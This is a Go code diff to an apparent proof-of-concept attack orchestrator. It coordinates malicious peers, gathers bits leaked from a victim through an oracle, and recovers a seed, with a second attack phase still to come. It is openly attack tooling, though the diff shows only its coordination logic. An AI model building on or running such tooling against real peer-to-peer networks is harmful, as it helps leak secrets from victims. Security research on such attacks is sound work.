@@ -26,12 +26,15 @@ type Orchestrator struct {
 	incoming chan *peerMessage
 	victim string
 	oracleCh chan byte
-	oracleReply []byte
+	//oracleReply []byte
 	attackPhase utils.AttackPhase
 	chainBuilt bool
 	localMaliciousPeers bool
 	firstMasterSet bool
 	mu sync.Mutex
+	syncOps int
+	syncCh chan struct{}
+
 }
 
 func New(errc chan error) *Orchestrator {
@@ -48,6 +51,8 @@ func New(errc chan error) *Orchestrator {
 		chainBuilt: false,
 		localMaliciousPeers: true,
 		firstMasterSet: false,
+		syncOps: 0,
+		syncCh: make(chan struct{}),
 	}
 
 	return o
@@ -171,16 +176,44 @@ func (o *Orchestrator) leadAttack() {
 	fmt.Println("Attack ready to go")
 	defer o.close()
 
+	var oracleReply []byte
 	for {
 		bit := <-o.oracleCh
 		fmt.Println("Received new oracle bit:", bit)
-		o.oracleReply = append(o.oracleReply, bit)
+		oracleReply = append(oracleReply, bit)
 		
-		if len(o.oracleReply)==utils.RequiredOracleBits {
-			fmt.Println("Leaked bitstring:", o.oracleReply)
+		if len(oracleReply) == utils.RequiredOracleBits - 1 {	// We got all but one oracle bits, so we notify
+																// the peers that they are now leaking the last one.
+																// However, we notify this only after one has been
+																// chosen as master peer, to ease phase transition.
+																// For the same goal, we relay the SetVictim message
+																// only after LastOracleBit has been sent.
+			for {
+				if o.syncOps == utils.RequiredOracleBits {
+					break
+				}
+				time.Sleep(100*time.Millisecond)
+			}
+			o.sendAll(msg.LastOracleBit)
+			o.syncCh <- struct{}{}
+		}
+		if len(oracleReply)==utils.RequiredOracleBits {
+			fmt.Println("Leaked bitstring:", oracleReply)
+			seed, err := recoverSeed(oracleReply)
+			if err != nil {
+				fmt.Println("Could not recover seed")
+				o.errc <- err
+				return
+			}
+			fmt.Println("Recovered seed:", seed)
 			break
 		}
 	}
+
+	o.attackPhase = utils.SyncPhase
+	// From here on, we develop the second phase of the attack
+
+
 
 	o.errc <- nil
 }
@@ -269,6 +302,7 @@ func (o *Orchestrator) handleMessages() {
 			case msg.MasterPeer.Code:
 				o.peerset.masterPeer = sender
 				fmt.Println("Master peer " + o.peerset.masterPeer.id + " is now leading victim sync")
+				o.syncOps++
 			case msg.SetVictim.Code:
 				victimID := string(message.Content)
 				if o.victim == "" {
@@ -281,6 +315,9 @@ func (o *Orchestrator) handleMessages() {
 					return
 				}
 				go func() {
+					if o.syncOps == utils.RequiredOracleBits - 1 {
+						<-o.syncCh
+					}
 					err := o.sendAllExcept(message, sender)
 					if err != nil {
 						o.errc <- err
